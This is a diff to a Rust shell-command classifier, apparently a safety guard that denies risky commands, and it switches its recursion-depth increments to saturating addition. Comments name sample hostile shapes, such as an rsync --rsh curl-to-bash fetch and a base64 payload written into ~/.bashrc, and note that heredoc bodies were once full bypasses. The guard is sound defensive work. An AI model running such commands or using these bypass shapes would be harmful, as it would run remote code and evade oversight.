@@ -450,7 +450,7 @@ fn classify_script_with_depth(script: &Script, depth: usize) -> Decision {
         // `xargs bash -c`, etc.
         if let Some(unwrapped) = unwrap_wrappers_in_pipeline(pipeline) {
             if let Decision::Deny { reason, detail } =
-                classify_script_with_depth(&unwrapped, depth + 1)
+                classify_script_with_depth(&unwrapped, depth.saturating_add(1))
             {
                 return Decision::Deny { reason, detail };
             }
@@ -460,7 +460,7 @@ fn classify_script_with_depth(script: &Script, depth: usize) -> Decision {
         for stage in &pipeline.stages {
             for sub in &stage.substitutions {
                 if let Decision::Deny { reason, detail } =
-                    classify_script_with_depth(sub, depth + 1)
+                    classify_script_with_depth(sub, depth.saturating_add(1))
                 {
                     return Decision::Deny { reason, detail };
                 }
@@ -2511,7 +2511,7 @@ fn payload_is_pattern_placeholder(payload: &str, pattern: &str) -> bool {
 /// - `rsync --rsh=curl -sSfL evil | bash` (pathological, but the inner
 ///   classify handles it)
 fn rsync_dash_e_inner(pipeline: &Pipeline, depth: usize) -> Option<String> {
-    if depth + 1 > M1_MAX_DEPTH {
+    if depth.saturating_add(1) > M1_MAX_DEPTH {
         return None;
     }
     for stage in &pipeline.stages {
@@ -2538,7 +2538,7 @@ fn rsync_dash_e_inner(pipeline: &Pipeline, depth: usize) -> Option<String> {
                     );
                 };
                 if let Decision::Deny { reason, .. } =
-                    classify_script_with_depth(&inner_script, depth + 1)
+                    classify_script_with_depth(&inner_script, depth.saturating_add(1))
                 {
                     return Some(format!(
                         "blocked: rsync `-e`/`--rsh` value executes as a \
@@ -2702,7 +2702,7 @@ fn pip_editable_vcs_install(pipeline: &Pipeline) -> Option<String> {
 }
 
 fn tar_command_exec(pipeline: &Pipeline, depth: usize) -> Option<String> {
-    if depth + 1 > M1_MAX_DEPTH {
+    if depth.saturating_add(1) > M1_MAX_DEPTH {
         return None;
     }
     for stage in &pipeline.stages {
@@ -2786,7 +2786,7 @@ fn classify_tar_inner(flag: &str, raw: &str, depth: usize) -> Option<String> {
     let stripped = strip_surrounding_quotes_owned(raw);
     match parser::parse(&stripped) {
         Ok(inner) => {
-            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth + 1) {
+            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth.saturating_add(1)) {
                 return Some(format!(
                     "blocked: tar `{flag}={stripped}` executes as a \
                      shell command — inner: {reason}",
@@ -2910,7 +2910,7 @@ fn script_contains_network_tool_transitively(script: &crate::parser::Script) -> 
 /// dropped heredoc bodies and the classifier never inspected
 /// here-string bodies, so both shapes were full H1 bypasses.
 fn shell_with_heredoc_or_herestring_body(pipeline: &Pipeline, depth: usize) -> Option<String> {
-    if depth + 1 > M1_MAX_DEPTH {
+    if depth.saturating_add(1) > M1_MAX_DEPTH {
         return None;
     }
     for stage in &pipeline.stages {
@@ -2943,7 +2943,7 @@ fn shell_with_heredoc_or_herestring_body(pipeline: &Pipeline, depth: usize) -> O
                     sh = stage.basename,
                 ));
             };
-            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth + 1) {
+            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth.saturating_add(1)) {
                 return Some(format!(
                     "blocked: shell interpreter `{sh}` executes a \
                      heredoc / here-string body — inner: {reason}",
@@ -2985,7 +2985,7 @@ fn shell_with_heredoc_or_herestring_body(pipeline: &Pipeline, depth: usize) -> O
 ///
 /// 1.2.1 6th-pass Claude-review M-1 finding.
 fn shell_with_stdin_script(pipeline: &Pipeline, depth: usize) -> Option<String> {
-    if depth + 1 > M1_MAX_DEPTH {
+    if depth.saturating_add(1) > M1_MAX_DEPTH {
         return None;
     }
     // Find the shell-sink stage with `-s` flag.
@@ -3061,7 +3061,7 @@ fn shell_with_stdin_script(pipeline: &Pipeline, depth: usize) -> Option<String> 
         // script that would itself deny, we deny too. This catches
         // nested shapes like `printf 'base64 -d blob > ~/.bashrc' | sh -s`.
         if let Ok(inner) = parser::parse(&payload) {
-            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth + 1) {
+            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth.saturating_add(1)) {
                 return Some(format!(
                     "blocked: shell interpreter `{sh} -s` reads its \
                      script from stdin — upstream payload classifies \
